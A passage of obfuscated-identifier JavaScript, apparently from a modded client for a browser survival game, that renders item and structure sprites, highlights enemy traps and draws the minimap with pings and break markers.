      _0x1ad37b.fillStyle = _0x54575e.type == 2 ? _0x401995 == 2 ? "#938d77" : "#939393" : "#e0c655";
      renderStar(_0x1ad37b, 3, _0x54575e.scale, _0x54575e.scale);
      _0x1ad37b.fill();
      _0x1ad37b.stroke();
      _0x1ad37b.shadowBlur = null;
      _0x1ad37b.shadowColor = null;
      _0x1ad37b.fillStyle = _0x54575e.type == 2 ? _0x401995 == 2 ? "#b2ab90" : "#bcbcbc" : "#ebdca3";
      renderStar(_0x1ad37b, 3, _0x54575e.scale * 0.55, _0x54575e.scale * 0.65);
      _0x1ad37b.fill();
    }
    _0xc83f19 = _0x5ebadc;
    gameObjectSprites[_0x5ecf6e] = _0xc83f19;
  }
  return _0xc83f19;
}
let itemSprites = [];
function getItemSprite(_0x588ec2, _0x294c1e) {
  let _0x19e6cb = itemSprites[_0x588ec2.id];
  if (!_0x19e6cb || _0x294c1e) {
    let _0x3dcdc6 = !_0x294c1e ? 20 : 5;
    let _0x39e2ee = document.createElement("canvas");
    let _0x58d122 = !_0x294c1e && _0x588ec2.name == "windmill" ? items.list[4].scale : _0x588ec2.scale;
    _0x39e2ee.width = _0x39e2ee.height = _0x58d122 * 2.5 + outlineWidth + (items.list[_0x588ec2.id].spritePadding || 0) + _0x3dcdc6;
    let _0x255258 = _0x39e2ee.getContext("2d");
    _0x255258.translate(_0x39e2ee.width / 2, _0x39e2ee.height / 2);
    _0x255258.rotate(_0x294c1e ? 0 : Math.PI / 2);
    _0x255258.strokeStyle = outlineColor;
    _0x255258.lineWidth = outlineWidth * (_0x294c1e ? _0x39e2ee.width / 81 : 1);
    if (!_0x294c1e) {
      _0x255258.shadowBlur = 8;
      _0x255258.shadowColor = "rgba(0, 0, 0, 0.2)";
    }
    if (_0x588ec2.name == "apple") {
      _0x255258.fillStyle = "#c15555";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fillStyle = "#89a54c";
      let _0x1fd9a5 = -(Math.PI / 2);
      renderLeaf(_0x588ec2.scale * Math.cos(_0x1fd9a5), _0x588ec2.scale * Math.sin(_0x1fd9a5), 25, _0x1fd9a5 + Math.PI / 2, _0x255258);
    } else if (_0x588ec2.name == "cookie") {
      _0x255258.fillStyle = "#cca861";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fillStyle = "#937c4b";
      let _0xec1ae6 = 4;
      let _0xa2ff76 = Math.PI * 2 / _0xec1ae6;
      let _0x2701d0;
      for (let _0x4bc579 = 0; _0x4bc579 < _0xec1ae6; ++_0x4bc579) {
        _0x2701d0 = UTILS.randInt(_0x588ec2.scale / 2.5, _0x588ec2.scale / 1.7);
        renderCircle(_0x2701d0 * Math.cos(_0xa2ff76 * _0x4bc579), _0x2701d0 * Math.sin(_0xa2ff76 * _0x4bc579), UTILS.randInt(4, 5), _0x255258, true);
      }
    } else if (_0x588ec2.name == "cheese") {
      _0x255258.fillStyle = "#f4f3ac";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fillStyle = "#c3c28b";
      let _0xb908d0 = 4;
      let _0x48df87 = Math.PI * 2 / _0xb908d0;
      let _0xb1f80e;
      for (let _0x2d143b = 0; _0x2d143b < _0xb908d0; ++_0x2d143b) {
        _0xb1f80e = UTILS.randInt(_0x588ec2.scale / 2.5, _0x588ec2.scale / 1.7);
        renderCircle(_0xb1f80e * Math.cos(_0x48df87 * _0x2d143b), _0xb1f80e * Math.sin(_0x48df87 * _0x2d143b), UTILS.randInt(4, 5), _0x255258, true);
      }
    } else if (_0x588ec2.name == "wood wall" || _0x588ec2.name == "stone wall" || _0x588ec2.name == "castle wall") {
      _0x255258.fillStyle = _0x588ec2.name == "castle wall" ? "#83898e" : _0x588ec2.name == "wood wall" ? "#a5974c" : "#939393";
      let _0x4c236f = _0x588ec2.name == "castle wall" ? 4 : 3;
      renderStar(_0x255258, _0x4c236f, _0x588ec2.scale * 1.1, _0x588ec2.scale * 1.1);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = _0x588ec2.name == "castle wall" ? "#9da4aa" : _0x588ec2.name == "wood wall" ? "#c9b758" : "#bcbcbc";
      renderStar(_0x255258, _0x4c236f, _0x588ec2.scale * 0.65, _0x588ec2.scale * 0.65);
      _0x255258.fill();
    } else if (_0x588ec2.name == "spikes" || _0x588ec2.name == "greater spikes" || _0x588ec2.name == "poison spikes" || _0x588ec2.name == "spinning spikes") {
      _0x255258.fillStyle = _0x588ec2.name == "poison spikes" ? "#7b935d" : "#939393";
      let _0x5b279f = _0x588ec2.scale * 0.6;
      renderStar(_0x255258, _0x588ec2.name == "spikes" ? 5 : 6, _0x588ec2.scale, _0x5b279f);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#a5974c";
      renderCircle(0, 0, _0x5b279f, _0x255258);
      _0x255258.fillStyle = "#c9b758";
      renderCircle(0, 0, _0x5b279f / 2, _0x255258, true);
    } else if (_0x588ec2.name == "windmill" || _0x588ec2.name == "faster windmill" || _0x588ec2.name == "power mill") {
      _0x255258.fillStyle = "#a5974c";
      renderCircle(0, 0, _0x58d122, _0x255258);
      _0x255258.fillStyle = "#c9b758";
      renderRectCircle(0, 0, _0x58d122 * 1, 29, 4, _0x255258);
      _0x255258.fillStyle = "#a5974c";
      renderCircle(0, 0, _0x58d122 * 0.5, _0x255258);
    } else if (_0x588ec2.name == "mine") {
      _0x255258.fillStyle = "#939393";
      renderStar(_0x255258, 3, _0x588ec2.scale, _0x588ec2.scale);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#bcbcbc";
      renderStar(_0x255258, 3, _0x588ec2.scale * 0.55, _0x588ec2.scale * 0.65);
      _0x255258.fill();
    } else if (_0x588ec2.name == "sapling") {
      for (let _0x4d8611 = 0; _0x4d8611 < 2; ++_0x4d8611) {
        let _0x98617f = _0x588ec2.scale * (!_0x4d8611 ? 1 : 0.5);
        renderStar(_0x255258, 7, _0x98617f, _0x98617f * 0.7);
        _0x255258.fillStyle = !_0x4d8611 ? "#9ebf57" : "#b4db62";
        _0x255258.fill();
        if (!_0x4d8611) {
          _0x255258.stroke();
        }
      }
    } else if (_0x588ec2.name == "pit trap") {
      _0x255258.fillStyle = "#a5974c";
      renderStar(_0x255258, 3, _0x588ec2.scale * 1.1, _0x588ec2.scale * 1.1);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = outlineColor;
      renderStar(_0x255258, 3, _0x588ec2.scale * 0.65, _0x588ec2.scale * 0.65);
      _0x255258.fill();
    } else if (_0x588ec2.name == "boost pad") {
      _0x255258.fillStyle = "#7e7f82";
      renderRect(0, 0, _0x588ec2.scale * 2, _0x588ec2.scale * 2, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#dbd97d";
      renderTriangle(_0x588ec2.scale * 1, _0x255258);
    } else if (_0x588ec2.name == "turret") {
      _0x255258.fillStyle = "#a5974c";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#939393";
      let _0x5902ac = 50;
      renderRect(0, -_0x5902ac / 2, _0x588ec2.scale * 0.9, _0x5902ac, _0x255258);
      renderCircle(0, 0, _0x588ec2.scale * 0.6, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
    } else if (_0x588ec2.name == "platform") {
      _0x255258.fillStyle = "#cebd5f";
      let _0x37ef6e = 4;
      let _0x4842f9 = _0x588ec2.scale * 2;
      let _0x516f4d = _0x4842f9 / _0x37ef6e;
      let _0x1371ad = -(_0x588ec2.scale / 2);
      for (let _0x474193 = 0; _0x474193 < _0x37ef6e; ++_0x474193) {
        renderRect(_0x1371ad - _0x516f4d / 2, 0, _0x516f4d, _0x588ec2.scale * 2, _0x255258);
        _0x255258.fill();
        _0x255258.stroke();
        _0x1371ad += _0x4842f9 / _0x37ef6e;
      }
    } else if (_0x588ec2.name == "healing pad") {
      _0x255258.fillStyle = "#7e7f82";
      renderRect(0, 0, _0x588ec2.scale * 2, _0x588ec2.scale * 2, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#db6e6e";
      renderRectCircle(0, 0, _0x588ec2.scale * 0.65, 20, 4, _0x255258, true);
    } else if (_0x588ec2.name == "spawn pad") {
      _0x255258.fillStyle = "#7e7f82";
      renderRect(0, 0, _0x588ec2.scale * 2, _0x588ec2.scale * 2, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.fillStyle = "#71aad6";
      renderCircle(0, 0, _0x588ec2.scale * 0.6, _0x255258);
    } else if (_0x588ec2.name == "blocker") {
      _0x255258.fillStyle = "#7e7f82";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.rotate(Math.PI / 4);
      _0x255258.fillStyle = "#db6e6e";
      renderRectCircle(0, 0, _0x588ec2.scale * 0.65, 20, 4, _0x255258, true);
    } else if (_0x588ec2.name == "teleporter") {
      _0x255258.fillStyle = "#7e7f82";
      renderCircle(0, 0, _0x588ec2.scale, _0x255258);
      _0x255258.fill();
      _0x255258.stroke();
      _0x255258.rotate(Math.PI / 4);
      _0x255258.fillStyle = "#d76edb";
      renderCircle(0, 0, _0x588ec2.scale * 0.5, _0x255258, true);
    }
    _0x19e6cb = _0x39e2ee;
    if (!_0x294c1e) {
      itemSprites[_0x588ec2.id] = _0x19e6cb;
    }
  }
  return _0x19e6cb;
}
function getItemSprite2(_0x8e78f7, _0x16ce77, _0x1f6500) {
  let _0x44b355 = mainContext;
  let _0x19ae00 = _0x8e78f7.name == "windmill" ? items.list[4].scale : _0x8e78f7.scale;
  _0x44b355.save();
  _0x44b355.translate(_0x16ce77, _0x1f6500);
  _0x44b355.rotate(_0x8e78f7.dir);
  _0x44b355.strokeStyle = outlineColor;
  _0x44b355.lineWidth = outlineWidth;
  if (_0x8e78f7.name == "apple") {
    _0x44b355.fillStyle = "#c15555";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fillStyle = "#89a54c";
    let _0x5ce1b2 = -(Math.PI / 2);
    renderLeaf(_0x8e78f7.scale * Math.cos(_0x5ce1b2), _0x8e78f7.scale * Math.sin(_0x5ce1b2), 25, _0x5ce1b2 + Math.PI / 2, _0x44b355);
  } else if (_0x8e78f7.name == "cookie") {
    _0x44b355.fillStyle = "#cca861";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fillStyle = "#937c4b";
    let _0x2baf8c = 4;
    let _0x20b794 = Math.PI * 2 / _0x2baf8c;
    let _0x3e2a70;
    for (let _0x559426 = 0; _0x559426 < _0x2baf8c; ++_0x559426) {
      _0x3e2a70 = UTILS.randInt(_0x8e78f7.scale / 2.5, _0x8e78f7.scale / 1.7);
      renderCircle(_0x3e2a70 * Math.cos(_0x20b794 * _0x559426), _0x3e2a70 * Math.sin(_0x20b794 * _0x559426), UTILS.randInt(4, 5), _0x44b355, true);
    }
  } else if (_0x8e78f7.name == "cheese") {
    _0x44b355.fillStyle = "#f4f3ac";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fillStyle = "#c3c28b";
    let _0x5e2340 = 4;
    let _0x17500d = Math.PI * 2 / _0x5e2340;
    let _0x146f95;
    for (let _0x30b79c = 0; _0x30b79c < _0x5e2340; ++_0x30b79c) {
      _0x146f95 = UTILS.randInt(_0x8e78f7.scale / 2.5, _0x8e78f7.scale / 1.7);
      renderCircle(_0x146f95 * Math.cos(_0x17500d * _0x30b79c), _0x146f95 * Math.sin(_0x17500d * _0x30b79c), UTILS.randInt(4, 5), _0x44b355, true);
    }
  } else if (_0x8e78f7.name == "wood wall" || _0x8e78f7.name == "stone wall" || _0x8e78f7.name == "castle wall") {
    _0x44b355.fillStyle = _0x8e78f7.name == "castle wall" ? "#83898e" : _0x8e78f7.name == "wood wall" ? "#a5974c" : "#939393";
    let _0x33c849 = _0x8e78f7.name == "castle wall" ? 4 : 3;
    renderStar(_0x44b355, _0x33c849, _0x8e78f7.scale * 1.1, _0x8e78f7.scale * 1.1);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = _0x8e78f7.name == "castle wall" ? "#9da4aa" : _0x8e78f7.name == "wood wall" ? "#c9b758" : "#bcbcbc";
    renderStar(_0x44b355, _0x33c849, _0x8e78f7.scale * 0.65, _0x8e78f7.scale * 0.65);
    _0x44b355.fill();
  } else if (_0x8e78f7.name == "spikes" || _0x8e78f7.name == "greater spikes" || _0x8e78f7.name == "poison spikes" || _0x8e78f7.name == "spinning spikes") {
    _0x44b355.fillStyle = _0x8e78f7.name == "poison spikes" ? "#7b935d" : "#939393";
    let _0x23fe62 = _0x8e78f7.scale * 0.6;
    renderStar(_0x44b355, _0x8e78f7.name == "spikes" ? 5 : 6, _0x8e78f7.scale, _0x23fe62);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x23fe62, _0x44b355);
    _0x44b355.fillStyle = "#c9b758";
    renderCircle(0, 0, _0x23fe62 / 2, _0x44b355, true);
  } else if (_0x8e78f7.name == "windmill" || _0x8e78f7.name == "faster windmill" || _0x8e78f7.name == "power mill") {
    _0x44b355.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x19ae00, _0x44b355);
    _0x44b355.fillStyle = "#c9b758";
    renderRectCircle(0, 0, _0x19ae00 * 1.5, 29, 4, _0x44b355);
    _0x44b355.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x19ae00 * 0.5, _0x44b355);
  } else if (_0x8e78f7.name == "mine") {
    _0x44b355.fillStyle = "#939393";
    renderStar(_0x44b355, 3, _0x8e78f7.scale, _0x8e78f7.scale);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#bcbcbc";
    renderStar(_0x44b355, 3, _0x8e78f7.scale * 0.55, _0x8e78f7.scale * 0.65);
    _0x44b355.fill();
  } else if (_0x8e78f7.name == "sapling") {
    for (let _0x53d587 = 0; _0x53d587 < 2; ++_0x53d587) {
      let _0xf408d4 = _0x8e78f7.scale * (!_0x53d587 ? 1 : 0.5);
      renderStar(_0x44b355, 7, _0xf408d4, _0xf408d4 * 0.7);
      _0x44b355.fillStyle = !_0x53d587 ? "#9ebf57" : "#b4db62";
      _0x44b355.fill();
      if (!_0x53d587) {
        _0x44b355.stroke();
      }
    }
  } else if (_0x8e78f7.name == "pit trap") {
    _0x44b355.fillStyle = "#a5974c";
    renderStar(_0x44b355, 3, _0x8e78f7.scale * 1.1, _0x8e78f7.scale * 1.1);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = outlineColor;
    renderStar(_0x44b355, 3, _0x8e78f7.scale * 0.65, _0x8e78f7.scale * 0.65);
    _0x44b355.fill();
  } else if (_0x8e78f7.name == "boost pad") {
    _0x44b355.fillStyle = "#7e7f82";
    renderRect(0, 0, _0x8e78f7.scale * 2, _0x8e78f7.scale * 2, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#dbd97d";
    renderTriangle(_0x8e78f7.scale * 1, _0x44b355);
  } else if (_0x8e78f7.name == "turret") {
    _0x44b355.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#939393";
    let _0x30a632 = 50;
    renderRect(0, -_0x30a632 / 2, _0x8e78f7.scale * 0.9, _0x30a632, _0x44b355);
    renderCircle(0, 0, _0x8e78f7.scale * 0.6, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
  } else if (_0x8e78f7.name == "platform") {
    _0x44b355.fillStyle = "#cebd5f";
    let _0xa325d8 = 4;
    let _0x162e03 = _0x8e78f7.scale * 2;
    let _0x55d965 = _0x162e03 / _0xa325d8;
    let _0x2da400 = -(_0x8e78f7.scale / 2);
    for (let _0x55f26e = 0; _0x55f26e < _0xa325d8; ++_0x55f26e) {
      renderRect(_0x2da400 - _0x55d965 / 2, 0, _0x55d965, _0x8e78f7.scale * 2, _0x44b355);
      _0x44b355.fill();
      _0x44b355.stroke();
      _0x2da400 += _0x162e03 / _0xa325d8;
    }
  } else if (_0x8e78f7.name == "healing pad") {
    _0x44b355.fillStyle = "#7e7f82";
    renderRect(0, 0, _0x8e78f7.scale * 2, _0x8e78f7.scale * 2, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, _0x8e78f7.scale * 0.65, 20, 4, _0x44b355, true);
  } else if (_0x8e78f7.name == "spawn pad") {
    _0x44b355.fillStyle = "#7e7f82";
    renderRect(0, 0, _0x8e78f7.scale * 2, _0x8e78f7.scale * 2, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.fillStyle = "#71aad6";
    renderCircle(0, 0, _0x8e78f7.scale * 0.6, _0x44b355);
  } else if (_0x8e78f7.name == "blocker") {
    _0x44b355.fillStyle = "#7e7f82";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.rotate(Math.PI / 4);
    _0x44b355.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, _0x8e78f7.scale * 0.65, 20, 4, _0x44b355, true);
  } else if (_0x8e78f7.name == "teleporter") {
    _0x44b355.fillStyle = "#7e7f82";
    renderCircle(0, 0, _0x8e78f7.scale, _0x44b355);
    _0x44b355.fill();
    _0x44b355.stroke();
    _0x44b355.rotate(Math.PI / 4);
    _0x44b355.fillStyle = "#d76edb";
    renderCircle(0, 0, _0x8e78f7.scale * 0.5, _0x44b355, true);
  }
  _0x44b355.restore();
}
let objSprites = [];
function getObjSprite(_0x3007db) {
  let _0x5a9147 = objSprites[_0x3007db.id];
  if (!_0x5a9147) {
    let _0x81dff1 = document.createElement("canvas");
    _0x81dff1.width = _0x81dff1.height = _0x3007db.scale * 2.5 + outlineWidth + (items.list[_0x3007db.id].spritePadding || 0) + 0;
    let _0x2377f4 = _0x81dff1.getContext("2d");
    _0x2377f4.translate(_0x81dff1.width / 2, _0x81dff1.height / 2);
    _0x2377f4.rotate(Math.PI / 2);
    _0x2377f4.strokeStyle = outlineColor;
    _0x2377f4.lineWidth = outlineWidth;
    if (_0x3007db.name == "spikes" || _0x3007db.name == "greater spikes" || _0x3007db.name == "poison spikes" || _0x3007db.name == "spinning spikes") {
      _0x2377f4.fillStyle = _0x3007db.name == "poison spikes" ? "#7b935d" : "#939393";
      let _0x4e3224 = _0x3007db.scale * 0.6;
      renderStar(_0x2377f4, _0x3007db.name == "spikes" ? 5 : 6, _0x3007db.scale, _0x4e3224);
      _0x2377f4.fill();
      _0x2377f4.stroke();
      _0x2377f4.fillStyle = "#a5974c";
      renderCircle(0, 0, _0x4e3224, _0x2377f4);
      _0x2377f4.fillStyle = "#cc5151";
      renderCircle(0, 0, _0x4e3224 / 2, _0x2377f4, true);
    } else if (_0x3007db.name == "pit trap") {
      _0x2377f4.fillStyle = "#a5974c";
      renderStar(_0x2377f4, 3, _0x3007db.scale * 1.1, _0x3007db.scale * 1.1);
      _0x2377f4.fill();
      _0x2377f4.stroke();
      _0x2377f4.fillStyle = "#cc5151";
      renderStar(_0x2377f4, 3, _0x3007db.scale * 0.65, _0x3007db.scale * 0.65);
      _0x2377f4.fill();
    }
    _0x5a9147 = _0x81dff1;
    objSprites[_0x3007db.id] = _0x5a9147;
  }
  return _0x5a9147;
}
function getMarkSprite(_0x47ae67, _0x15dd35, _0x4706b0, _0x19b104) {
  let _0x20a7ab = {
    x: screenWidth / 2,
    y: screenHeight / 2
  };
  _0x15dd35.lineWidth = outlineWidth;
  mainContext.globalAlpha = 0.2;
  _0x15dd35.strokeStyle = outlineColor;
  _0x15dd35.save();
  _0x15dd35.translate(_0x4706b0, _0x19b104);
  _0x15dd35.rotate(90 ** 10);
  if (_0x47ae67.name == "spikes" || _0x47ae67.name == "greater spikes" || _0x47ae67.name == "poison spikes" || _0x47ae67.name == "spinning spikes") {
    _0x15dd35.fillStyle = _0x47ae67.name == "poison spikes" ? "#7b935d" : "#939393";
    var _0x2970ca = _0x47ae67.scale;
    renderStar(_0x15dd35, _0x47ae67.name == "spikes" ? 5 : 6, _0x47ae67.scale, _0x2970ca);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x2970ca, _0x15dd35);
    if (player && _0x47ae67.owner && player.sid != _0x47ae67.owner.sid && !tmpObj.findAllianceBySid(_0x47ae67.owner.sid)) {
      _0x15dd35.fillStyle = "#a34040";
    } else {
      _0x15dd35.fillStyle = "#c9b758";
    }
    renderCircle(0, 0, _0x2970ca / 2, _0x15dd35, true);
  } else if (_0x47ae67.name == "turret") {
    renderCircle(0, 0, _0x47ae67.scale, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.fillStyle = "#939393";
    let _0x3ec8aa = 50;
    renderRect(0, -_0x3ec8aa / 2, _0x47ae67.scale * 0.9, _0x3ec8aa, _0x15dd35);
    renderCircle(0, 0, _0x47ae67.scale * 0.6, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
  } else if (_0x47ae67.name == "teleporter") {
    _0x15dd35.fillStyle = "#7e7f82";
    renderCircle(0, 0, _0x47ae67.scale, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.rotate(Math.PI / 4);
    _0x15dd35.fillStyle = "#d76edb";
    renderCircle(0, 0, _0x47ae67.scale * 0.5, _0x15dd35, true);
  } else if (_0x47ae67.name == "platform") {
    _0x15dd35.fillStyle = "#cebd5f";
    let _0x12f209 = 4;
    let _0x44e890 = _0x47ae67.scale * 2;
    let _0x4b8913 = _0x44e890 / _0x12f209;
    let _0x1912c5 = -(_0x47ae67.scale / 2);
    for (let _0x43e56c = 0; _0x43e56c < _0x12f209; ++_0x43e56c) {
      renderRect(_0x1912c5 - _0x4b8913 / 2, 0, _0x4b8913, _0x47ae67.scale * 2, _0x15dd35);
      _0x15dd35.fill();
      _0x15dd35.stroke();
      _0x1912c5 += _0x44e890 / _0x12f209;
    }
  } else if (_0x47ae67.name == "healing pad") {
    _0x15dd35.fillStyle = "#7e7f82";
    renderRect(0, 0, _0x47ae67.scale * 2, _0x47ae67.scale * 2, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, _0x47ae67.scale * 0.65, 20, 4, _0x15dd35, true);
  } else if (_0x47ae67.name == "spawn pad") {
    _0x15dd35.fillStyle = "#7e7f82";
    renderRect(0, 0, _0x47ae67.scale * 2, _0x47ae67.scale * 2, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.fillStyle = "#71aad6";
    renderCircle(0, 0, _0x47ae67.scale * 0.6, _0x15dd35);
  } else if (_0x47ae67.name == "blocker") {
    _0x15dd35.fillStyle = "#7e7f82";
    renderCircle(0, 0, _0x47ae67.scale, _0x15dd35);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    _0x15dd35.rotate(Math.PI / 4);
    _0x15dd35.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, _0x47ae67.scale * 0.65, 20, 4, _0x15dd35, true);
  } else if (_0x47ae67.name == "windmill" || _0x47ae67.name == "faster windmill" || _0x47ae67.name == "power mill") {
    _0x15dd35.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x47ae67.scale, _0x15dd35);
    _0x15dd35.fillStyle = "#c9b758";
    renderRectCircle(0, 0, _0x47ae67.scale * 1.5, 29, 4, _0x15dd35);
    _0x15dd35.fillStyle = "#a5974c";
    renderCircle(0, 0, _0x47ae67.scale * 0.5, _0x15dd35);
  } else if (_0x47ae67.name == "pit trap") {
    _0x15dd35.fillStyle = "#a5974c";
    renderStar(_0x15dd35, 3, _0x47ae67.scale * 1.1, _0x47ae67.scale * 1.1);
    _0x15dd35.fill();
    _0x15dd35.stroke();
    if (player && _0x47ae67.owner && player.sid != _0x47ae67.owner.sid && !tmpObj.findAllianceBySid(_0x47ae67.owner.sid)) {
      _0x15dd35.fillStyle = "#a34040";
    } else {
      _0x15dd35.fillStyle = outlineColor;
    }
    renderStar(_0x15dd35, 3, _0x47ae67.scale * 0.65, _0x47ae67.scale * 0.65);
    _0x15dd35.fill();
  }
  _0x15dd35.restore();
}
function isOnScreen(_0x48aa6b, _0x528649, _0x3fd59c) {
  return _0x48aa6b + _0x3fd59c >= 0 && _0x48aa6b - _0x3fd59c <= maxScreenWidth && _0x528649 + _0x3fd59c >= 0 && (_0x528649, _0x3fd59c, maxScreenHeight);
}
function renderGameObjects(_0x22c03c, _0x2648ba, _0x4bf897) {
  let _0x2c9421;
  let _0x3cf274;
  let _0x2f949d;
  liztobj.forEach(_0x34d02d => {
    tmpObj = _0x34d02d;
    if (tmpObj.active && liztobj.includes(_0x34d02d) && tmpObj.render) {
      _0x3cf274 = tmpObj.x + tmpObj.xWiggle - _0x2648ba;
      _0x2f949d = tmpObj.y + tmpObj.yWiggle - _0x4bf897;
      if (_0x22c03c == 0) {
        tmpObj.update(delta);
      }
      mainContext.globalAlpha = tmpObj.alpha;
      if (tmpObj.layer == _0x22c03c && isOnScreen(_0x3cf274, _0x2f949d, tmpObj.scale + (tmpObj.blocker || 0))) {
        if (tmpObj.isItem) {
          if ((tmpObj.dmg || tmpObj.trap) && !tmpObj.isTeamObject(player)) {
            _0x2c9421 = getObjSprite(tmpObj);
          } else {
            _0x2c9421 = getItemSprite(tmpObj);
          }
          mainContext.save();
          mainContext.translate(_0x3cf274, _0x2f949d);
          mainContext.rotate(tmpObj.dir);
          if (!tmpObj.active) {
            mainContext.scale(tmpObj.visScale / tmpObj.scale, tmpObj.visScale / tmpObj.scale);
          }
          mainContext.drawImage(_0x2c9421, -(_0x2c9421.width / 2), -(_0x2c9421.height / 2));
          if (tmpObj.blocker) {
            mainContext.strokeStyle = "#db6e6e";
            mainContext.globalAlpha = 0.3;
            mainContext.lineWidth = 6;
            renderCircle(0, 0, tmpObj.blocker, mainContext, false, true);
          }
          mainContext.restore();
        } else {
          _0x2c9421 = getResSprite(tmpObj);
          mainContext.drawImage(_0x2c9421, _0x3cf274 - _0x2c9421.width / 2, _0x2f949d - _0x2c9421.height / 2);
        }
      }
      if (_0x22c03c == 3 && !useWasd) {
        if (tmpObj.health < tmpObj.maxHealth) {
          mainContext.fillStyle = darkOutlineColor;
          mainContext.roundRect(_0x3cf274 - config.healthBarWidth / 2 - config.healthBarPad, _0x2f949d - config.healthBarPad, config.healthBarWidth + config.healthBarPad * 2, 17, 8);
          mainContext.fill();
          mainContext.fillStyle = tmpObj.isTeamObject(player) ? "#037d50" : "#cc5151";
          mainContext.roundRect(_0x3cf274 - config.healthBarWidth / 2, _0x2f949d, config.healthBarWidth * (tmpObj.health / tmpObj.maxHealth), 17 - config.healthBarPad * 2, 7);
          mainContext.fill();
        }
      }
    }
  });
  if (_0x22c03c == 0) {
    if (placeVisible.length) {
      placeVisible.forEach(_0x38a767 => {
        _0x3cf274 = _0x38a767.x - _0x2648ba;
        _0x2f949d = _0x38a767.y - _0x4bf897;
        markObject(_0x38a767, _0x3cf274, _0x2f949d);
      });
    }
  }
}
function markObject(_0x4f6c7b, _0x15744e, _0x268e39) {
  getMarkSprite(_0x4f6c7b, mainContext, _0x15744e, _0x268e39);
}
class MapPing {
  constructor(_0xc2cd2f, _0x1ff13c) {
    this.init = function (_0x564290, _0x37d26e) {
      this.scale = 0;
      this.x = _0x564290;
      this.y = _0x37d26e;
      this.active = true;
    };
    this.update = function (_0x130c5c, _0x3a6259) {
      if (this.active) {
        this.scale += _0x3a6259 * 0.05;
        if (this.scale >= _0x1ff13c) {
          this.active = false;
        } else {
          _0x130c5c.globalAlpha = 1 - Math.max(0, this.scale / _0x1ff13c);
          _0x130c5c.beginPath();
          _0x130c5c.arc(this.x / config.mapScale * mapDisplay.width, this.y / config.mapScale * mapDisplay.width, this.scale, 0, Math.PI * 2);
          _0x130c5c.stroke();
        }
      }
    };
    this.color = _0xc2cd2f;
  }
}
function pingMap(_0x29f76e, _0x1c0361) {
  tmpPing = mapPings.find(_0x9c043 => !_0x9c043.active);
  if (!tmpPing) {
    tmpPing = new MapPing("#fff", config.mapPingScale);
    mapPings.push(tmpPing);
  }
  tmpPing.init(_0x29f76e, _0x1c0361);
}
function updateMapMarker() {
  mapMarker.x = player.x;
  mapMarker.y = player.y;
}
function renderMinimap(_0x34ba06) {
  if (player && player.alive) {
    mapContext.clearRect(0, 0, mapDisplay.width, mapDisplay.height);
    mapContext.lineWidth = 4;
    for (let _0x51fd62 = 0; _0x51fd62 < mapPings.length; ++_0x51fd62) {
      tmpPing = mapPings[_0x51fd62];
      mapContext.strokeStyle = tmpPing.color;
      tmpPing.update(mapContext, _0x34ba06);
    }
    mapContext.globalAlpha = 1;
    mapContext.fillStyle = "#ff0000";
    if (breakTrackers.length) {
      mapContext.fillStyle = "#abcdef";
      mapContext.font = "34px Hammersmith One";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      for (let _0x3c2714 = 0; _0x3c2714 < breakTrackers.length;) {
        mapContext.fillText("!", breakTrackers[_0x3c2714].x / config.mapScale * mapDisplay.width, breakTrackers[_0x3c2714].y / config.mapScale * mapDisplay.height);
        _0x3c2714 += 2;
      }
    }
    mapContext.globalAlpha = 1;
    mapContext.fillStyle = "#fff";
